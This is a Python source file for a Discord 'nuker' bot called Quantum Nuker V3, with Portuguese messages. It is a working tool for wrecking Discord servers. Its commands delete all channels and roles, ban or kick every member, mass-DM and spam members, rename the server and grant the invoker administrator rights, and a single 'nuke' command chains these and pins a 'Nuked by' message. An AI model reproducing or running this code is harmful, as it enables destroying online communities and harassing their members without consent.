from http.client import TOO_MANY_REQUESTS
import json
import os
import traceback
import datetime

import colorama
import discord
import requests
from colorama import Fore
from discord.ext import commands

colorama.init()
os.system('cls')

try:
    with open("version.txt") as data:
        version = data.readline()
except FileNotFoundError:
    try:
        with open("../version.txt") as data:
            version = data.readline()
    except FileNotFoundError:
        version = ""

embedColor = 0x0000ff
colors = {"cyan": Fore.CYAN,
          "white": Fore.WHITE,
          "red": Fore.RED,
          "lightred": Fore.LIGHTRED_EX,
          "blue": Fore.BLUE,
          "lightblue": Fore.LIGHTBLUE_EX,
          "green": Fore.GREEN,
          "lightgreen": Fore.LIGHTGREEN_EX,
          "purple": Fore.MAGENTA,
          "lightpurple": Fore.LIGHTMAGENTA_EX,
          "black": Fore.BLACK,
          "lightblack": Fore.LIGHTBLACK_EX,
          "yellow": Fore.YELLOW,
          "lightyellow": Fore.LIGHTYELLOW_EX,
          "reset": Fore.RESET,
          "lightwhite": Fore.LIGHTWHITE_EX}
msgs = {"info": f"{colors['red']}[{colors['white']}INFO{colors['red']}]{colors['reset']}",
        "sucess": f"{colors['red']}[{colors['lightgreen']}SUCESSO{colors['red']}]{colors['reset']}",
        "+": f"{colors['red']}[{colors['lightgreen']}+{colors['red']}]{colors['reset']}",
        "input2": f"{colors['red']}[{colors['blue']}INPUT{colors['red']}]{colors['reset']}",
        "error": f"{colors['red']}[{colors['lightred']}ERRO{colors['red']}]{colors['reset']}",
        "input": f"{colors['blue']}>>>{colors['white']}",
        "pressenter": f"{colors['red']}[{colors['white']}INFO{colors['red']}] {colors['white']}Pressione 'ENTER' para sair"}


async def msg_delete(ctx):
    """
    Tentando excluir a mensagem de ativação
    """
    try:
        await ctx.message.delete()
    except:
        print(f"{msgs['error']} Não é possível excluir sua mensagem.")


def userOrBot():
    """
    Retorna com True se o token pertence à conta do usuário
    Retorna com False se o token pertence à conta do robô
    """
    if requests.get("https://discord.com/api/v8/users/@me", headers={"Authorization": f'{token}'}).status_code == 200:
        return True
    else:
        return False


def checkVersion():
    """
    Verificando novas versões no GitHub
    """
    if version == "3.0.3":
        return ""
    req = requests.get(
        "https://raw.githubusercontent.com/user001js/Quantum-Nuker-V3/main/quantum3.py")
    if req.status_code == requests.codes.ok:
        gitVersion = req.text.rstrip()
        if version == gitVersion:
            return "(versão recente)"
        else:
            return "(atualização disponível)"
    else:
        return "(erro ao verificar a versão)"


def checkActivity(type, text):
    if type == "playing" or "jogando":
        return discord.Game(name=text)
    elif type == "listening" or "ouvindo":
        return discord.Activity(type=discord.ActivityType.listening, name=text)
    elif type == "watching" or "assistindo":
        return discord.Activity(type=discord.ActivityType.watching, name=text)
    else:
        return None


print(f'{colors["red"]}\n     ' + "\n"
      r'                  ________  ___  ___  ________  ________   _________  ___  ___  _____ ______    ' + "\n"
      r'                 |\   __  \|\  \|\  \|\   __  \|\   ___  \|\___   ___\\  \|\  \|\   _ \  _   \   ' + "\n"
      r'                 \ \  \|\  \ \  \\\  \ \  \|\  \ \  \\ \  \|___ \  \_\ \  \\\  \ \  \\\__\ \  \   ' + "\n"
      r'                  \ \  \\\  \ \  \\\  \ \   __  \ \  \\ \  \   \ \  \ \ \  \\\  \ \  \\|__| \  \   ' + "\n"
      r'                   \ \  \\\  \ \  \\\  \ \  \ \  \ \  \\ \  \   \ \  \ \ \  \\\  \ \  \    \ \  \   ' + "\n"
      r'                    \ \_____  \ \_______\ \__\ \__\ \__\\ \__\   \ \__\ \ \_______\ \__\    \ \__\   ' + "\n"
      r'                     \|___| \__\|_______|\|__|\|__|\|__| \|__|    \|__|  \|_______|\|__|     \|__|    ' + "\n"
      r'                           \|__|                                                                        '
      '\n'
      r'                     ________   ___  ___  ___  __    _______   ________          ___      ___ ________     ' + "\n"
      r'                     |\   ___  \|\  \|\  \|\  \|\  \ |\  ___ \ |\   __  \        |\  \    /  /|\_____  \    ' + "\n"
      r'                     \ \  \\ \  \ \  \\\  \ \  \/  /|\ \   __/|\ \  \|\  \       \ \  \  /  / ||____|\ /_    ' + "\n"
      r'                      \ \  \\ \  \ \  \\\  \ \   ___  \ \  \_|/_\ \   _  _\       \ \  \/  / /      \|\  \    ' + "\n"
      r'                       \ \  \\ \  \ \  \\\  \ \  \\ \  \ \  \_|\ \ \  \\  \|       \ \    / /      __\_\  \    ' + "\n"
      r'                        \ \__\\ \__\ \_______\ \__\\ \__\ \_______\ \__\\ _\        \ \__/ /      |\_______\    ' + "\n"
      r'                         \|__| \|__|\|_______|\|__| \|__|\|_______|\|__|\|__|        \|__|/       \|_______|     ' + "\n"
      '\n'
      "\n"
      "\n"
      "\n"
      f"{colors['white']}                           Developed by {colors['blue']}user 001#0001{colors['white']}\n"
      "\n"
      f"{colors['white']}                           Version: {colors['lightblue']}{version} {checkVersion()}{colors['white']}\n"
      f"{colors['white']}                           Community: {colors['lightblue']}discord.gg/2AkAeZD6BU{colors['white']}\n"
      f"{colors['white']}                           YouTube Channel: {colors['lightred']}youtube.com/channel/UChhgLjZCc8ZaG_ogWWKwyyA{colors['white']}\n"
      f"{colors['white']}                           Project: {colors['lightgreen']}https://github.com/user001js/Quantum-Nuker-V3\n{colors['white']}"
      f"{colors['white']}                           Language: {colors['lightgreen']}PT-BR {colors['green']}Brazilian Portuguese\n\n{colors['white']}")

"""
Fetching prefix, token and owner ID's from config
If there's no config, requests data from the user and creates it
"""
try:
    with open(f"config.json", encoding='utf8') as data:
        config = json.load(data)
    token = config["token"]
    prefix = config["prefix"]
    ownersID = config["ownersID"]
    whiteListBool = config["whitelistbool"]
    activity = config["activity"]
    print(f"{msgs['info']} O arquivo \"config.json\" foi carregado com sucesso!")
except FileNotFoundError:
    token = input(f"{msgs['input2']} Insira o Token {msgs['input']} ")
    prefix = input(f"{msgs['input2']} Insira um prefixo {msgs['input']} ")
    ownersID = input(
        f"{msgs['input2']} Insira o ID de usuário dos proprietários dos bots (se mais de um, use ',') {msgs['input']} ")
    whiteListYesOrNo = input(
        f"{msgs['input2']} Deseja ativar a lista de permissões? ('y' ou 's' para sim e 'n' para não) {msgs['input']} ").lower()
    whiteListBool = True if whiteListYesOrNo == "y" or "s" else False
    ownersID = ownersID.replace(" ", "")
    if "," in ownersID:
        ownersID = ownersID.split(",")
        ownersID = list(map(int, ownersID))
    else:
        ownersID = [int(ownersID)]
    activity = {"type": "playing",
                "text": f"Quantum Nuker V3 by MI-1",
                "isenabled": True}
    config = {
        "token": token,
        "prefix": prefix,
        "ownersID": ownersID,
        "whitelistbool": whiteListBool,
        "activity": activity
    }
    with open("config.json", "w") as data:
        json.dump(config, data, indent=2)
    print(f"{msgs['info']} O arquivo config.json foi criado com sucesso!!")
# shitcode :)
if userOrBot() == True:
    print(f"{msgs['info']} O Quantum Nuker ainda não suporta 'selfbots', mas provavelmente será adicionado em futuras atualizações!")
    print(msgs['pressenter'])
    input()
    os._exit(0)

if activity["isenabled"]:
    activityToBot = checkActivity(activity["type"], activity["text"])
else:
    activityToBot = None


bot = commands.Bot(command_prefix=prefix, self_bot=userOrBot(),
                   activity=activityToBot, intents=discord.Intents.all())
bot.remove_command("help")


def isOwner(ctx):
    return ctx.author.id in ownersID


def isWhitelisted(ctx):
    if whiteListBool:
        return ctx.author.id in ownersID
    else:
        return True


@bot.event
async def on_ready():
    print(f"\n\n{colors['lightblue']}" + ("—"*75).center(95) + f"\n{colors['white']}" +
          f"Conectado com sucesso em \"{colors['blue']}{bot.user}{colors['white']}\"".center(95) + "\n" +
          f"Prefixo do robô:{colors['blue']} {bot.command_prefix}{colors['white']}".center(95) + "\n" +
          f"Proprietários do robô:{colors['lightblue']} {ownersID} {colors['white']}".center(95) + "\n" +
          f"Quantidade total de membros:{colors['blue']} {len(bot.users)} {colors['white']}".center(95) + "\n" +
          f"Quantidade total de servidores:{colors['blue']} {len(bot.guilds)} {colors['white']}".center(95) + f"\n{colors['lightblue']}" + ("—"*75).center(95) + f"\n\n{colors['white']}")


@bot.event
async def on_command(ctx):
    print(
        f"{msgs['info']} Comando executado com sucesso: \"{ctx.command}\" ({colors['blue']}{ctx.message.author}{colors['white']})")


@bot.event
async def on_command_error(ctx, err):
    errors = commands.errors
    if (isinstance(err, errors.BadArgument) or isinstance(err, commands.MissingRequiredArgument)
            or isinstance(err, errors.PrivateMessageOnly) or isinstance(err, errors.CheckFailure)
            or isinstance(err, errors.CommandNotFound)):
        return
    elif isinstance(err, errors.MissingPermissions):
        print(f"{msgs['error']} Permissões ausentes")
    else:
        print(
            f'{colors["red"]}\n\n{"".join(traceback.format_exception(type(err), err, err.__traceback__))}{colors["white"]}\n')


@bot.command(name='help')
@commands.check(isWhitelisted)
async def help(ctx):
    await msg_delete(ctx)
    p = bot.command_prefix
    embed = discord.Embed(title="Ajuda e informações — Quantum Nuker", description="Baixe o **Quantum Nuker V3** __[aqui](https://github.com/user001js/Quantum-Nuker-V3)__.", color=embedColor)
    embed.set_author(name="Quantum Nuker V3", url="https://github.com/user001js/Quantum-Nuker-V3")
    embed.add_field(name="Destruição em massa", value=f"`{p}1`, `{p}nk`, `{p}nuke`, `{p}atacar`, `{p}dest`, `{p}destruir`, `{p}attack` ou `{p}n` + `<banir 1/0>` `<mensagem de texto>`", inline=False)
    embed.add_field(name="Banir todos os membros do servidor", value=f"`{p}2`, `{p}be`, `{p}baneveryone`, `{p}banall`, `{p}banirtodos` ou `{p}ba`", inline=False)
    embed.add_field(name="Expulsar todos os membros do servidor", value=f"`{p}3`, `{p}ke`, `{p}kickeveryone`, `{p}expulsartodos`, `{p}kickall` ou `{p}ka`", inline=False)
    embed.add_field(name="Renomear todos os membros do servidor", value=f"`{p}4`, `{p}rn`, `{p}rnall`, `{p}rmall`, `{p}renameallmembers` ou `{p}renomeartodos` + <novo nome de usuário>`", inline=False)
    embed.add_field(name="Enviar mensagem de texto no privado de todos os membros do serv.", value=f"`{p}5`, `{p}dme`, `{p}mdall`, `{p}dmall`, `{p}dma` ou `{p}dmeveryone` + `<mensagem>`", inline=False)
    embed.add_field(name="Enviar mensagem(ns) em todos os canais do servidor (\"spam all\")", value=f"`{p}6`, `{p}sa`, `{p}sac`, `{p}spamallchannels` ou `{p}scall` + `<quantidade de mensagens> <texto>`", inline=False)
    embed.add_field(name="Enviar mensagem(ns) no canal atual (\"spam\")", value=f"`{p}7`, `{p}sc`, `{p}spamchannels`, `{p}spamchannel`, `{p}stc` oi `{p}scc` + `<quantidade de mensagens> <texto>`", inline=False)
    embed.add_field(name="Deletar todos os canais do servidor", value=f"`{p}8`, `{p}dch`, `{p}dac`, `{p}deleteallchannels` ou `{p}delallchannels`", inline=True)
    embed.add_field(name="Deletar todos os cargos do servidor", value=f"`{p}9`, `{p}dr`, `{p}delallroles`, `{p}dar`, `{p}deleteroles`, `{p}delroles` ou `{p}deleteallroles`", inline=True)
    embed.add_field(name="\u200b", value="\u200b", inline=TOO_MANY_REQUESTS)
    embed.add_field(name="Criar canais no servidor (\"spam channels\")", value=f"`{p}10`, `{p}sch`, `{p}spamcurrentchannel`, `{p}createchannels` ou `{p}criarcanais` + `<quantidade> <nome dos canais>`", inline=True)
    embed.add_field(name="Criar cargos no servidor (\"spam roles\")", value=f"`{p}11`, `{p}sr`, `{p}spamroles`, `{p}swr`, `{p}criarcargos`, `{p}createroles` ou `{p}cr` + `<quantidade> <nome dos cargos>`", inline=True)
    embed.add_field(name="\u200b", value="\u200b", inline=True)
    embed.add_field(name="Editar ícone do servidor", value=f"`{p}12`, `{p}si`, `{p}editservericon`, `{p}editicon`, `{p}iconserver`, `{p}edi` + `<anexo/link/arquivo`", inline=True)
    embed.add_field(name="Editar nome do servidor", value=f"`{p}13`, `{p}sn`, `{p}edm`, `{p}editservername`, `{p}servername`, `{p}editarnomedoservidor` + `<nome>`", inline=True)
    embed.add_field(name="Obter cargo com permissões administrativas", value=f"`{p}14`, `{p}ga`, `{p}getadmin`, `{p}obteradmin`, `{p}conseguiradmin` ou `{p}admin` + `<nome do cargo>`", inline=False)
    embed.add_field(name="\u200b", value="\u200b", inline=True)
    embed.add_field(name="Recuperar (somente em mensagem direta)", value=f"> Cria 1 canal de texto no servidor (use caso você tenha deletado todos os canais no servidor).\nUse `{p}15 <ID do servidor>`, `{p}rg <ID do servidor>`, `{p}recuperarservidor <ID do servidor>`, `{p}rs <ID do servidor>` ou `{p}recuperateserver <ID do servidor>`.", inline=True)
    embed.add_field(name="Configurações", value=f"`{p}settings` ou `{p}config`")
    embed.add_field(name="\u200b\nInformações — Quantum Nuker", value=f"> **Quantum Nuker V3**\nDesenvolvido por <@984580784956510228>, com o [MI-1](https://discord.gg/2AkAeZD6BU)\nVersão: {version} {checkVersion()}\nProjeto: https://github.com/user001js/Quantum-Nuker-V3\nServidor do Discord: https://discord.gg/2AkAeZD6BU\n> **Lista de comandos**\nEncontre os comandos e mais informações clicando __[aqui](https://github.com/user001js/Quantum-Nuker-V2/README.md)__.", inline=False)
    await ctx.message.author.send(embed=embed)


@bot.group(name='settings', aliases=["config", "configurações", "set", "configurar", "alterar"], invoke_without_command=True)
@commands.check(isWhitelisted)
async def settings(ctx):
    p = bot.command_prefix
    embed = discord.Embed(
        title="Configurações — Quantum Nuker", description="Configurações disponíveis:\n`Os comandos aqui só poderão ser executados pelos usuários definidos como proprietários do robô.`", color=embedColor)
    embed.set_author(name="Quantum Nuker V3", url="https://github.com/user001js/Quantum-Nuker-V3")
    embed.add_field(
        name="Prefixo", value=f"> Altere o prefixo do(a) \"{bot.user}\".\nUse `{p}config prefix <prefixo>`, `{p}config prefixo <prefixo>` ou `{p}configurar prefixo <prefixo>`", inline=False)
    embed.add_field(
        name="Proprietários", value=f"> Adicione ou remova um(a) usuário(a) da equipe de proprietários do(a) \"{bot.user}\".\nUse `{p}settings owners <add/remove> <menção/ID>` ou `{p}configurar owners <add/remove> <menção/ID>`", inline=False)
    embed.add_field(
        name="Lista de permissões (\"whitelist\")", value=f"> Ative ou desative a lista de permissões.\nUse `{p}settings whitelist <on/off>` ou `{p}configurar whitelist <on/off>`", inline=True)
    embed.add_field(
        name="Atividade do robô", value=f"> Altere ou desative a atividade do(a) \"{bot.user}\".\n> Tipos disponíveis de atividades: `playing` ou `jogando`, `listening` ou `ouvindo`, `watching` ou `assistindo`.\nUse `{p}settings activity <set/off> <tipo> <texto>` ou `{p}configurar atividade <set/off> <tipo> <texto>`.", inline=False)
    await ctx.message.author.send(embed=embed)


@settings.command(name='prefix', aliases=["prefixo"])
@commands.check(isOwner)
async def settingsPrefix(ctx, newPrefix):
    global config
    bot.command_prefix = newPrefix
    config['prefix'] = newPrefix
    with open("config.json", "w") as data:
        json.dump(config, data, indent=2)
    await ctx.message.add_reaction('<:verified_MI1:1025192104714059808>')
    print(
        f"{msgs['info']} O novo prefixo do(a) \"{bot.user}\" agora é \"{colors['blue']}{newPrefix}{colors['white']}\".")


@settings.command(name='owners', aliases=["owner", "ownersID", "ownerID"])
@commands.check(isOwner)
async def settingownersID(ctx, action, *, users):
    global config
    users = users.replace('<@!', '')
    users = users.replace('>', '')
    users = users.replace(" ", "")
    if "," in users:
        users = users.split(",")
        users = list(map(int, users))
    else:
        users = [int(users)]
    if action == "add":
        config["ownersID"] += users
        with open("config.json", "w") as data:
            json.dump(config, data, indent=2)
        print(
            f"{msgs['info']}{colors['lightblue']}{str(users)[1:-1]}{colors['white']} usuário(s) foi/foram adicionado(s)como proprietário(s) do(a) \"{bot.user}\".")
        await ctx.message.add_reaction('<:verified_MI1:1025192104714059808>')
    elif action == "remove" or "delete":
        for user in users:
            config["ownersID"].remove(user)
        with open("config.json", "w") as data:
            json.dump(config, data, indent=2)
        print(
            f"{msgs['info']} Foram removidos {colors['cyan']}{str(users)[1:-1]}{colors['white']} usuários da equipe de administradores e proprietários do(a) \"{bot.user}\"")
        await ctx.message.add_reaction('<:verified_MI1:1025192104714059808>')
    else:
        await ctx.message.add_reaction('<:unverified_MI1:1025192725487812738>')


@settings.command(name='whitelist', aliases=["whitelisting", "permlist", "listadeperm"])
@commands.check(isOwner)
async def settingsWhitelist(ctx, action):
    global config
    global whiteListBool
    if action.lower() == "on" or "enable":
        whiteListBool = True
        config["whitelistbool"] = True
        with open("config.json", "w") as data:
            json.dump(config, data, indent=2)
        print(f"{msgs['info']} {colors['lightgreen']}Lista de permissões ativada!{colors['reset']}")
        await ctx.message.add_reaction('<:verified_MI1:1025192104714059808>')
    elif action.lower() == "off" or "disable":
        whiteListBool = False
        config["whitelistbool"] = False
        with open("config.json", "w") as data:
            json.dump(config, data, indent=2)
        print(f"{msgs['info']} Lista de permissões desativada!")
        await ctx.message.add_reaction('<:verified_MI1:1025192104714059808>')
    else:
        await ctx.message.add_reaction('<:unverified_MI1:1025192725487812738>')


@settings.command(name='activity', alises=["atividade"])
@commands.check(isOwner)
async def settingsActivity(ctx, action, activityType="playing", *, text=f"Quantum Nuker v{version}"):
    global config
    global activity
    if action == "set":
        await bot.change_presence(activity=checkActivity(activityType, text))
        activity = {"type": activityType,
                    "text": text,
                    "isenabled": True}
        config["activity"] = activity
        with open("config.json", "w") as data:
            json.dump(config, data, indent=2)
        print(f"{msgs['info']} {colors['lightgreen']}Atividade alterada com sucesso!{colors['reset']}")
        await ctx.message.add_reaction('<:verified_MI1:1025192104714059808>')
    elif action == "on" or action == "enable":
        await bot.change_presence(activity=checkActivity(activity["type"], activity["text"]))
        activity["isenabled"] = True
        config["activity"] = activity
        with open("config.json", "w") as data:
            json.dump(config, data, indent=2)
        print(f"{msgs['info']} Atividade ativada.")
        await ctx.message.add_reaction('<:verified_MI1:1025192104714059808>')
    elif action == "off" or action == "disable":
        await bot.change_presence(activity=None)
        activity["isenabled"] = False
        config["activity"] = activity
        with open("config.json", "w") as data:
            json.dump(config, data, indent=2)
        print(f"{msgs['info']} Atividade desativada.")
        await ctx.message.add_reaction('<:verified_MI1:1025192104714059808>')
    else:
        await ctx.message.add_reaction('<:unverified_MI1:1025192725487812738>')


@bot.command(name='1', aliases=["nk", "nuke", "atacar", "dest", "destruir", "attack", "n"])
@commands.check(isWhitelisted)
async def nuke(ctx, ban: bool = True, text: str = "Quantum Nuker"):
    await msg_delete(ctx)

    """
    Tentando alterar o ícone e o nome do servidor
    """

    icon = await ctx.message.attachments[0].read() if ctx.message.attachments else None
    await ctx.guild.edit(name=text, icon=icon, banner=icon)

    """
    Tentando excluir todos os canais
    """

    for ch in ctx.guild.channels:
        try:
            await ch.delete()
            print(f"{msgs['info']} Canal deletado: \"{ch}\".")
        except:
            print(f"{msgs['error']} Não foi possível deletar o canal: \"{ch}\".")

    """
    Tentando banir todos se solicitado
    """

    if ban:
        for m in ctx.guild.members:
            if m.id not in ownersID:
                try:
                    await m.ban()
                    print(f"{msgs['info']} Membro(a) banido(a): \"{m}\".")
                except:
                    print(f"{msgs['error']} Não foi possível banir o(a) \"{m}\" do servidor.")
            else:
                print(f"{msgs['info']} O(a) \"{m}\" é o(a) proprietário(a) do servidor, não foi possível bani-lo(a) do servidor.")

    """
    Tentando excluir os cargos
    """

    for r in ctx.guild.roles:
        try:
            await r.delete()
            print(f"{msgs['+']} Cargo deletado: \"{r}\"")
        except:
            print(f"{msgs['error']} Não foi possível deletar o cargo: \"{r}\".")

    try:
        embed = discord.Embed(color=embedColor)
        embed.add_field(name="Quantum Nuker V3",
                        value="Este servidor acaba de ser derrubado pelo programa __**Quantum Nuker V3**__.\nDownload: https://github.com/user001js/Quantum-Nuker-V3", inline=False)
        channel = await ctx.guild.create_text_channel(name="Nuked by Quantum Nuker V3")
        message = await channel.send(embed=embed)
        await message.pin()
    except:
        pass


@bot.command(name='2', aliases=["be", "baneveryone", "banall", "banirtodos", "ba"])
@commands.check(isWhitelisted)
async def banEveryone(ctx):
    await msg_delete(ctx)
    for m in ctx.guild.members:
        if m.id not in ownersID:
            try:
                await m.ban()
                print(f"{msgs['+']} Membro(a) banido(a): \"{m}\".")
            except:
                print(f"{msgs['error']} Não foi possível banir o(a) \"{m}\" do servidor.")
        else:
            print(f"{msgs['info']} O(a) \"{m}\" é o(a) proprietário(a) do servidor, não foi possível bani-lo(a) do servidor.")


@bot.command(name='3', aliases=["ke", "kickeveryone", "expulsartodos", "kickall", "ka"])
@commands.check(isWhitelisted)
async def kickEveryone(ctx):
    await msg_delete(ctx)
    for m in ctx.guild.members:
        if m.id not in ownersID:
            try:
                await m.kick()
                print(f"{msgs['+']} Membro(a) expulso(a): \"{m}\"")
            except:
                print(f"{msgs['error']} Não foi possível expulsar o(a) \"{m}\" do servidor.")
        else:
            print(f"{msgs['info']} O(a) \"{m}\" é o(a) proprietário(a) do servidor, não foi possível bani-lo(a) do servidor.")


@bot.command(name="4", aliases=["rn", "rnall", "rmall", "renameallmembers", "renomeartodos"])
@commands.check(isWhitelisted)
async def renameEveryone(ctx, *, name="Quantum Nuker"):
    await msg_delete(ctx)
    for m in ctx.guild.members:
        if m.id not in ownersID:
            try:
                await m.edit(nick=name)
                print(f"{msgs['+']} O(a) \"{m}\" teve seu apelido alterado com sucesso.")
            except:
                print(f"{msgs['error']} Não foi possível alterar o nome de usuário do(a) \"{m}\".")
        else:
            print(f"{msgs['info']} O(a) \"{m.name}\" é o(a) proprietário(a) do servidor, não foi possível alterar o apelido.")


@bot.command(name="5", aliases=["dme", "mdall", "dmall", "dma", "dmeveryone"])
@commands.check(isWhitelisted)
async def dmEveryone(ctx, *, msg="@everyone Quantum Nuker has been destroyed this"):
    await msg_delete(ctx)
    for m in ctx.guild.members:
        if m.id not in ownersID:
            try:
                await m.send(msg)
                print(f"{msgs['+']} Mensagem enviada com sucesso para: \"{m}\".")
            except:
                print(f"{msgs['error']} Não foi possível enviar a mensagem para \"{m}\".")
        else:
            print(f"{msgs['info']} O(a) \"{m.name}\" é o(a) proprietário(a) do servidor.")


@bot.command(name="6", aliases=["sa", "sac", "spamallchannels", "scall"])
@commands.check(isWhitelisted)
async def spamToAllChannels(ctx, amount: int = 50, *, text="@everyone Quantum Nuker"):
    await msg_delete(ctx)
    for i in range(amount):
        for ch in ctx.guild.channels:
            try:
                await ch.send(text)
                print(f"{msgs['+']} Mensagem enviada no canal: \"{ch}\".")
            except:
                print(f"{msgs['error']} Não foi possível enviar a mensagem no canal \"{ch}\".")


@bot.command(name='7', aliases=["sc", "spamcurrentchannel", "spamchannel", "stc", "scc"])
@commands.check(isWhitelisted)
async def spamToCurrentChannel(ctx, amount: int = 50, *, text="@everyone Quantum Nuker"):
    await msg_delete(ctx)
    for i in range(amount):
        try:
            await ctx.channel.send(text)
            print(f"{msgs['+']} Mensagem enviada no canal: \"{ctx.channel}\".")
        except:
            print(f"{msgs['error']} Não foi possível enviar a mensagem ao canal \"{ctx.channel}\".")


@bot.command(name='8', aliases=["dch", "dac", "deleteallchannels", "delallchannels"])
@commands.check(isWhitelisted)
async def deleteAllChannels(ctx):
    await msg_delete(ctx)
    for ch in ctx.guild.channels:
        try:
            await ch.delete()
            print(f"{msgs['+']} Canal deletado com sucesso: \"{ch}\".")
        except:
            print(f"{msgs['error']} Não foi possível deletar o canal \"{ch}\".")


@bot.command(name='9', aliases=["dr", "delallroles", "dar", "deleteroles", "delroles", "deleteallroles"])
@commands.check(isWhitelisted)
async def deleteAllRoles(ctx):
    await msg_delete(ctx)
    for r in ctx.guild.roles:
        try:
            await r.delete()
            print(f"{msgs['+']} Cargo deletado com sucesso: \"{r}\".")
        except:
            print(f"{msgs['error']} Não foi possível deletar o cargo \"{r}\".")


@bot.command(name="10", aliases=["sch", "spamchannels", "createchannels", "criarcanais"])
@commands.check(isWhitelisted)
async def spamWithChannels(ctx, amount: int = 25, *, name="Quantum Nuker"):
    await msg_delete(ctx)
    for i in range(amount):
        try:
            await ctx.guild.create_text_channel(name=name)
            print(f"{msgs['+']} Canal criado com sucesso.")
        except:
            print(f"{msgs['error']} Não foi possível criar o canal.")


@bot.command(name="11", aliases=["sr", "spamroles", "swr", "criarcargos", "createroles", "cr"])
@commands.check(isWhitelisted)
async def spamWithRoles(ctx, amount: int = 25, *, name="Quantum Nuker"):
    await msg_delete(ctx)
    for i in range(amount):
        try:
            await ctx.guild.create_role(name=name)
            print(f"{msgs['+']} Cargo criado com sucesso.")
        except:
            print(f"{msgs['error']} Não foi possível criar o cargo.")


@bot.command(name='12', aliases=["si", "editservericon", "editicon", "iconserver", "edi"])
@commands.check(isWhitelisted)
async def editServerIcon(ctx):
    await msg_delete(ctx)
    if ctx.message.attachments:
        icon = await ctx.message.attachments[0].read()
    else:
        return

    try:
        await ctx.guild.edit(icon=icon)
        print(f"{msgs['+']} O ícone do servidor foi alterado com sucesso.")
    except:
        print(f"{msgs['error']} Não foi possível alterar o ícone do servidor.")


@bot.command(name='13', aliases=["sn", "edm", "editservername", "servername", "editarnomedoservidor"])
@commands.check(isWhitelisted)
async def editServerName(ctx, *, name="Quantum Nuker"):
    await msg_delete(ctx)
    try:
        await ctx.guild.edit(name=name)
        print(f"{msgs['+']} Nome do servidor alterado com sucesso.")
    except:
        print(f"{msgs['error']} Não foi possível alterar o nome do servidor.")


@bot.command(name="14", aliases=["ga", "getadmin", "obteradmin", "conseguiradmin", "admin"])
@commands.check(isWhitelisted)
async def getAdmin(ctx, *, rolename="Quantum Nuker"):
    await msg_delete(ctx)
    try:
        perms = discord.Permissions(administrator=True)
        role = await ctx.guild.create_role(name=rolename, permissions=perms)
        await ctx.message.author.add_roles(role)
        print(f"{msgs['+']} O cargo de administrador foi adicionado a/ao \"{ctx.message.author}\".")
    except:
        print(f"{msgs['error']} Não foi possível adicionar o cargo de administrador para o(a) \"{ctx.message.author}\".")


@bot.command(name='15', aliases=["rg", "recuperarservidor", "rs", "recuperateserver"])
@commands.check(isWhitelisted)
@commands.dm_only()
async def reviveGuild(ctx, guildId: int = None):
    if guildId:
        guild = bot.get_guild(guildId)
        try:
            await guild.create_text_channel(name="Quantum Nuker")
            print(f"{msgs['+']} O servidor \"{guild}\" foi recuperado com sucesso.")
        except:
            print(f"{msgs['error']} Não foi possível criar um canal para recuperar o servidor \"{guild}\".")


"""
Bot em execução
"""

try:
    bot.run(token, bot=not userOrBot())
except discord.errors.LoginFailure:
    print(f'{msgs["error"]} Token inválido!')
    print(msgs['pressenter'])
    input()
    os._exit(0)
except discord.errors.PrivilegedIntentsRequired:
    print(f"{msgs['error']} Parece que você não ativou as \'Intents\' necessárias no portal do desenvolvedor."
          f"Visite {colors['lightblue']}https://discord.com/developers/applications/ {colors['white']}e ative as \'Intents\'.\n")
    print(msgs['pressenter'])
    input()
    os._exit(0)
except Exception as e:
    print(f'{colors["lightred"]}\nOcorreu um erro durante o \"log-in\":\n{"".join(traceback.format_exception(type(e), e, e.__traceback__))}{colors["white"]}\n')
    print(msgs['pressenter'])
    input()
    os._exit(0)
